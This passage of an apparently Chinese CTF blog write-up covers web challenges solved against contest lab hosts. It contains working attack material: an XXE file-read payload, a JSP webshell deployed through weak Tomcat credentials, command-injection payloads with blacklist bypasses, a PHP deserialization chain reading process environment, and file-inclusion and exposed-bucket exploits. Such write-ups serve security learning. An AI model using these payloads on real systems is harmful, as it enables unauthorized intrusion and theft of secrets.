+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">src</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/tmp/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;src;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CVSmb1LzWo1pirxBHSYcphICnsg.png"></p>
+<p><img src="/images/XcT5bwyZPoSXzBxZhNIcf32cnSd.png"></p>
+<h3 id="做题启示-4"><a href="#做题启示-4" class="headerlink" title="做题启示"></a>做题启示</h3><p>文件包含的题，读源码找线索也是一个非常值得学习的经验，可以看到出题人的提示或者过滤方式，下面的 RCE 题</p>
+<p>也有这一招</p>
+<h2 id="问题-3-Tomcat-漏洞-Forgotten-Tomcat"><a href="#问题-3-Tomcat-漏洞-Forgotten-Tomcat" class="headerlink" title="[问题 3&#x2F;Tomcat 漏洞] Forgotten_Tomcat"></a>[问题 3&#x2F;Tomcat 漏洞] Forgotten_Tomcat</h2><p>Tomcat 漏洞，利用 admin&#x2F;password 弱口令进入后台</p>
+<p><img src="/images/WQFNb9wpWoUGQBxqMB2cnLJEniq.png"></p>
+<p>编写木马 jsp</p>
+<p><img src="/images/RgFnbKoZOoAekQxaBmjcQkFJnCb.png"></p>
+<p>先打包成 zip，再改拓展名为 war，得到文件 cmd.war；接着于此上传，点击部署</p>
+<p><img src="/images/WrUybh0GhoMRlbxTmSqccl78nFc.png"></p>
+<p>访问 <a target="_blank" rel="noopener" href="https://eci-2zeco2wi1ova90dnct1i.cloudeci1.ichunqiu.com:8080/cmd/cmd.jsp">https://eci-2zeco2wi1ova90dnct1i.cloudeci1.ichunqiu.com/cmd/cmd.jsp</a></p>
+<p>拿到 shell，通过 ls 查询到 flag 的位置，并成功打印</p>
+<p><img src="/images/I4atbGgxDoEhi4xs1pGc9IvLnPf.png"></p>
+<h3 id="做题启示-5"><a href="#做题启示-5" class="headerlink" title="做题启示"></a>做题启示</h3><p>这题就纯观赏题了，按 AI 的要求做的，体验了一下实际网站中注入木马的漏洞</p>
+<p>不过弱口令是我自己猜出来的</p>
+<h2 id="问题-4-RCE-扫盘-Server-Monitor"><a href="#问题-4-RCE-扫盘-Server-Monitor" class="headerlink" title="[问题 4&#x2F;RCE&#x2F;扫盘] Server_Monitor"></a>[问题 4&#x2F;RCE&#x2F;扫盘] Server_Monitor</h2><p>这题是真的，一个需要耐心的目录遍历 RCE，学到了很多东西</p>
+<p>一进题什么也没有</p>
+<p><img src="/images/GtVHbEAVCor2CDxfX6PcuQUEnme.png"></p>
+<p>通过 dirsearch 扫盘，发现路由&#x2F;assets</p>
+<p><img src="/images/IATVbAogUomXVdxlivictLBinlg.png"></p>
+<p>打开文件 <a target="_blank" rel="noopener" href="https://eci-2zej68f55x2uj34zmabn.cloudeci1.ichunqiu.com/assets/script.js">script.js</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ctx = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;latencyChart&#x27;</span>).<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> chart = <span class="keyword">new</span> <span class="title class_">Chart</span>(ctx, &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;line&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">labels</span>: [<span class="string">&#x27;0s&#x27;</span>, <span class="string">&#x27;3s&#x27;</span>, <span class="string">&#x27;6s&#x27;</span>, <span class="string">&#x27;9s&#x27;</span>, <span class="string">&#x27;12s&#x27;</span>],</span><br><span class="line">        <span class="attr">datasets</span>: [&#123;</span><br><span class="line">            <span class="attr">label</span>: <span class="string">&#x27;Latency (Google DNS)&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: [<span class="number">12</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">14</span>],</span><br><span class="line">            <span class="attr">borderColor</span>: <span class="string">&#x27;#00aaff&#x27;</span>,</span><br><span class="line">            <span class="attr">tension</span>: <span class="number">0.4</span></span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">options</span>: &#123; <span class="attr">responsive</span>: <span class="literal">true</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkSystemLatency</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> statusDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ping-status&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;8.8.8.8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;api.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: formData</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(data.<span class="property">status</span> === <span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">            statusDiv.<span class="property">innerText</span> = <span class="string">`Last check: <span class="subst">$&#123;data.output&#125;</span> ms`</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;Monitor Error:&#x27;</span>, data.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;API Error&#x27;</span>, err));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(checkSystemLatency, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现是一个命令拼接，路由为 api，形式为 post</p>
+<p>我们用 curl 的方法进行请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://eci-2zej68f55x2uj34zmabn.cloudeci1.ichunqiu.com/api.php --form-string &quot;target=;ls</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;output&quot;:0,&quot;debug&quot;:&quot;api.php\nassets\nindex.php\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接输 cat &#x2F;flag，被拒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Security Alert: Malicious input detected.&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接访问 api.php，发现黑名单</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;output&quot;</span>:0,<span class="string">&quot;debug&quot;</span>:<span class="string">&quot;&lt;?php\r\nerror_reporting(0);\r\nheader(&#x27;Content-Type: application\/json&#x27;);\r\n\r\nif (<span class="variable">$_SERVER</span>[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset(<span class="variable">$_POST</span>[&#x27;target&#x27;])) &#123;\r\n    <span class="variable">$target</span> = <span class="variable">$_POST</span>[&#x27;target&#x27;];\r\n    \r\n\r\n    <span class="variable">$blacklist</span> = \&quot;\/ |\\\/|\\*|\\?|&lt;|&gt;|cat|more|less|head|tail|tac|nl|od|vi|vim|sort|uniq|flag|base64|python|bash|sh\/i\&quot;;\r\n    \r\n    if (preg_match(<span class="variable">$blacklist</span>, <span class="variable">$target</span>)) &#123;\r\n        echo json_encode([\r\n            &#x27;status&#x27; =&gt; &#x27;error&#x27;, \r\n            &#x27;message&#x27; =&gt; &#x27;Security Alert: Malicious input detected.&#x27;\r\n        ]);\r\n        exit;\r\n    &#125;\r\n\r\n\r\n    <span class="variable">$cmd</span> = \&quot;ping -c 1 \&quot; . <span class="variable">$target</span>;\r\n    \r\n\r\n    <span class="variable">$output</span> = shell_exec(<span class="variable">$cmd</span>);\r\n    \r\n\r\n    if (<span class="variable">$output</span>) &#123;\r\n        preg_match(\&quot;\/time=([0-9.]+) ms\/\&quot;, <span class="variable">$output</span>, <span class="variable">$matches</span>);\r\n        <span class="variable">$time</span> = isset(<span class="variable">$matches</span>[1]) ? <span class="variable">$matches</span>[1] : 0;\r\n        \r\n        echo json_encode([\r\n            &#x27;status&#x27; =&gt; &#x27;success&#x27;,\r\n            &#x27;output&#x27; =&gt; <span class="variable">$time</span>,     \r\n            &#x27;debug&#x27; =&gt; <span class="variable">$output</span>     \r\n        ]);\r\n    &#125; else &#123;\r\n        echo json_encode([&#x27;status&#x27; =&gt; &#x27;error&#x27;, &#x27;message&#x27; =&gt; &#x27;Host unreachable&#x27;]);\r\n    &#125;\r\n&#125; else &#123;\r\n    echo json_encode([&#x27;status&#x27; =&gt; &#x27;error&#x27;, &#x27;message&#x27; =&gt; &#x27;Invalid Request&#x27;]);\r\n&#125;\r\n?&gt;\r\n&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于正斜杠被禁用，我们只能用 cd 和多指令方法进行目录拼接，同时用单引号绕过字符串匹配，通过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://eci-2zej68f55x2uj34zmabn.cloudeci1.ichunqiu.com/api.php --form-string <span class="string">&quot;target=;cd<span class="variable">$&#123;IFS&#125;</span>..;cd<span class="variable">$&#123;IFS&#125;</span>..;cd<span class="variable">$&#123;IFS&#125;</span>..;sed<span class="variable">$&#123;IFS&#125;</span>&#x27;p&#x27;<span class="variable">$&#123;IFS&#125;</span>fl&#x27;&#x27;ag</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;output&quot;:0,&quot;debug&quot;:&quot;flag&#123;c7971628-d751-4261-9f72-3aa84b4c99aa&#125;\nflag&#123;c7971628-d751-4261-9f72-3aa84b4c99aa&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="做题启示-6"><a href="#做题启示-6" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.黑盒的时候可以先用 cat 来查看源码</p>
+<p>2.斜杠被禁用时可以用 cd 加分号拼接做到目录遍历</p>
+<p>3.’’绕过特定字符串过滤一定要强化强化</p>
+<p>4.curl 的 POST 方法值得学习</p>
+<h2 id="问题-5-POP-链-Magic-Methods"><a href="#问题-5-POP-链-Magic-Methods" class="headerlink" title="[问题 5&#x2F;POP 链] Magic_Methods"></a>[问题 5&#x2F;POP 链] Magic_Methods</h2><p>一个很简单的反序列化 POP 链问题</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CmdExecutor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        system($<span class="built_in">this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MiddleMan</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">process</span><span class="params">()</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj-&gt;work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EntryPoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $worker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;worker-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;payload&#x27;</span>])) &#123;</span><br><span class="line">    $data = $_GET[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过试错，发现 flag 在环境变量里，故有 php 脚本:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class CmdExecutor &#123;</span><br><span class="line">    public <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MiddleMan &#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class EntryPoint &#123;</span><br><span class="line">    public <span class="variable">$worker</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=New EntryPoint();</span><br><span class="line"><span class="variable">$b</span>=New MiddleMan();</span><br><span class="line"><span class="variable">$c</span>=New CmdExecutor();</span><br><span class="line"><span class="variable">$a</span>-&gt;worker=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;cmd=<span class="string">&quot;cat /proc/self/environ&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;最终payload: &quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$payload</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>?payload=O:10:&quot;EntryPoint&quot;:1:{s:6:&quot;worker&quot;;O:9:&quot;MiddleMan&quot;:1:{s:3:&quot;obj&quot;;O:11:&quot;CmdExecutor&quot;:1:{s:3:&quot;cmd&quot;;s:22:&quot;cat /proc/self/environ&quot;;}}}</code></p>
+<p><img src="/images/BioibIJTPoDcVcxNGBmcflsinLc.png"></p>
+<h2 id="问题-6-源码审计-LookLook"><a href="#问题-6-源码审计-LookLook" class="headerlink" title="[问题 6&#x2F;源码审计] LookLook"></a>[问题 6&#x2F;源码审计] LookLook</h2><p>观察附件中的关键文件 <code>index.js</code></p>
+<p>找到并解析源码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> _0x<span class="number">4e8</span>a = process.env[<span class="string">&#x27;ICQ_FLAG&#x27;</span>]; <span class="comment">// 将环境变量 ICQ_FLAG 存入 _0x4e8a</span></span><br><span class="line"><span class="keyword">delete</span> process.env[<span class="string">&#x27;ICQ_FLAG&#x27;</span>]; <span class="comment">// 随后从环境变量中删除</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_0x7b2d === <span class="string">&#x27;reveal&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="built_in">json</span>(&#123;</span><br><span class="line">        status: <span class="string">&#x27;backdoor_active&#x27;</span>,</span><br><span class="line">        payload: _0x<span class="number">4e8</span>a <span class="comment">// 当条件满足时，通过 payload 返回 Flag</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(logger.init()); _// 这里使用了上面的 fast-logger 中间件_</span><br></pre></td></tr></table></figure>
+
+<p>因此只需要向该服务器的任意一个路由（例如首页 <code>/</code> 或 <code>/status</code>）发送一个 HTTP 请求，并在请求头中带上 <code>X-Poison-Check: reveal</code> 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;X-Poison-Check: reveal&quot; https://eci-2ze10dnbcv4zqi4ou8ee.cloudeci1.ichunqiu.com:5000/</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;backdoor_active&quot;,&quot;payload&quot;:&quot;flag&#123;5b290ba7-21ff-4cdc-bbe9-75a46d31cc79&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="做题启示-7"><a href="#做题启示-7" class="headerlink" title="做题启示"></a>做题启示</h3><p>了解了一下 web 源码的基本结构</p>
+<h2 id="问题-7-基础文件包含-Nexus"><a href="#问题-7-基础文件包含-Nexus" class="headerlink" title="[问题 7&#x2F;基础文件包含] Nexus"></a>[问题 7&#x2F;基础文件包含] Nexus</h2><p>读源码，看到这么一行注释</p>
+<p><img src="/images/GDj9bL77Sos3uMxx4fbcENeonwb.png"></p>
+<p>但似乎访问无果</p>
+<p><img src="/images/ZOY5bAcy7oDIB3xJN9tc4oNsnef.png"></p>
+<p>直接访问 vender</p>
+<p><img src="/images/VyuTbUL5VoTvFLxZxypchlxankf.png"></p>
+<p>顺着路线点进去</p>
+<p>发现 demo.php</p>
+<p><img src="/images/OjMYbrM0EoPTSLxhLcBc63VHnZe.png"></p>
+<p>似乎是个文件包含</p>
+<p><img src="/images/SIlEbyPLLoUyvCxATz9ca69bnjb.png"></p>
+<p>输入?file&#x3D;&#x2F;flag，通过</p>
+<p><img src="/images/ULfXbMubtojvBpxiYd9cCBHQnyd.png"></p>
+<h3 id="做题启示-8"><a href="#做题启示-8" class="headerlink" title="做题启示"></a>做题启示</h3><ol>
+<li>TODO 真是明显的提示，出现很多次了</li>
+<li>访问文件的时候也要访问一下上一级看看</li>
+</ol>
+<h2 id="问题-8-dirsearch-扫盘-nebula-cloud"><a href="#问题-8-dirsearch-扫盘-nebula-cloud" class="headerlink" title="[问题 8&#x2F;dirsearch 扫盘] nebula_cloud"></a>[问题 8&#x2F;dirsearch 扫盘] nebula_cloud</h2><p>使用 dirsearch 扫到路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nebula-public-assets/</span><br></pre></td></tr></table></figure>
+
+<p>访问，显示这个，找到黄底可疑的路由</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>nebula-public-assets<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Prefix</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Marker</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaxKeys</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">MaxKeys</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsTruncated</span>&gt;</span>false<span class="tag">&lt;/<span class="name">IsTruncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>dev/backups/infra/terraform.tfstate<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2026-02-01T04:07:05.675Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;3ac1a536ac2c82d17cb0c1bbaed806d7&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>331<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Owner</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ID</span>&gt;</span></span><br><span class="line">02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4</span><br><span class="line"><span class="tag">&lt;/<span class="name">ID</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DisplayName</span>&gt;</span>minio<span class="tag">&lt;/<span class="name">DisplayName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Owner</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>logo.png<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2026-02-01T04:07:05.587Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;29aa8f6b6c0fdfb327eb8d6c486d4a49&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>11<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Owner</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ID</span>&gt;</span></span><br><span class="line">02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4</span><br><span class="line"><span class="tag">&lt;/<span class="name">ID</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DisplayName</span>&gt;</span>minio<span class="tag">&lt;/<span class="name">DisplayName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Owner</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ListBucketResult</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问，获得文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nebula-public-assets/dev/backups/infra/terraform.tfstate</span><br></pre></td></tr></table></figure>
+
+<p>打开即得旗帜</p>
+<p><img src="/images/Nu0vbYencoEiWExvlgKc0V2Onzf.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一场比赛下来，dirsearch 扫盘出现了贼多次，web1 部分七个题也侧重于信息获取，提高了信息收集的能力</p>
+<p>也见到了许多没见到的绕过姿势和漏洞</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/02/01/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95-2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%C2%B7%E8%B5%9B%E9%A2%98WP/" rel="prev" title="[实战记录]2025春秋杯冬季赛·赛题WP">
+      <i class="fa fa-chevron-left"></i> [实战记录]2025春秋杯冬季赛·赛题WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/02/04/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E6%80%BB%E5%A4%8D%E4%B9%A0/" rel="next" title="第十一章-总复习">
+      第十一章-总复习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
